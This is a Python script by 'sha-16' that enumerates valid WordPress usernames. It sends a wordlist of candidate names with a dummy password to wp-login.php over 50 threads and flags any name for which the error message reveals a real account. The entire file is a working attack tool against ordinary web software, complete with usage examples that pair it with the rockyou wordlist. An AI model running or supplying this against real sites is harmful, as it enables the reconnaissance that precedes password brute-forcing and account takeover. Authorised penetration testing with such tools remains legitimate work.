#!/usr/bin/python3 

import requests, sys 
from concurrent.futures import ThreadPoolExecutor
from pwn import *

# WORDPRESS USER ENUM
# [*] Use:  wp-user-enum <WORDLIST> <URL>
# By: Diego Osorio (alias sha-16) 



def banner():
    print(
"""
 __      ___ __        _   _ ___  ___ _ __       ___ _ __  _   _ _ __ ___  
 \ \ /\ / / '_ \ _____| | | / __|/ _ \ '__|____ / _ \ '_ \| | | | '_ ` _ \ 
  \ V  V /| |_) |_____| |_| \__ \  __/ | |_____|  __/ | | | |_| | | | | | | 
   \_/\_/ | .__/       \__,_|___/\___|_|        \___|_| |_|\__,_|_| |_| |_| (by sha-16)
          |_|                                                              
""")

##########################################################################################

def check_target(target):
    try: 
        requests.get(target, timeout=5)
        return True
    except:
        return False 

def check_wordlist(dic):
    try:
        with open(dic, 'r') as dictionary:
            return True
    except: 
        return False    
    
##########################################################################################

requests_errors = 0
string_checker = "The password you entered for the username"

def makeRequests(user): 

    data = {
        "log": user,
        "pwd": "random_string",
        "wp-submit": "Log In"
    }

    try:
        r = requests.post(url, data=data)
        
        if string_checker in r.text:
            print(f"> {user}") 

    except:
        global requests_errors
        requests_errors += 1
        if requests_errors == 10:
            print('\n[!] Error: there are too many errors with requests, please check if your target is up!')
            os._exit(2)

##########################################################################################

if __name__ == '__main__':

    banner()
    
    if len(sys.argv) == 3:     
    
        dic = sys.argv[1]    
        url = sys.argv[2]

        if check_target(url) and check_wordlist(dic):
            with open(dic, "r") as wordlist:     

                dictionary = []
                for word in wordlist:  
                    dictionary.append(word.rstrip())

                print("="*70)
                print(f"STARTING USER ENUMERATION...")
                print("="*70)
                print(f"[+] URL: {url}")
                print(f"[+] DICTIONARY: {dic}")
                print("="*70)
                print("[*] USERS FOUND:")
                print("-"*70)

                with ThreadPoolExecutor(max_workers=50) as executor: 
                    results = executor.map(makeRequests, dictionary)
    
                print("-"*70)
                print("FINISHED...!")
                sys.exit(0)

                
        else: 
            print("[!] ERROR: Something was wrong with your dictionary or your target...!")
            sys.exit(2)        


    else: 
        print("-"*70)
        print(f"[*] USE: wp-user-enum.py <USER-WORLDIST> <WP-URL>")
        print("-"*70)
        print("\n~ EXAMPLE: ")
        print(f"\n$ wp-user-enum.py users.txt http://wp-website.com/wp-login.php")
        print(f"$ wp-user-enum.py /usr/share/worldlists/rockyou.txt http://wp-website.com/wordpress/wp-login.php\n")

##########################################################################################
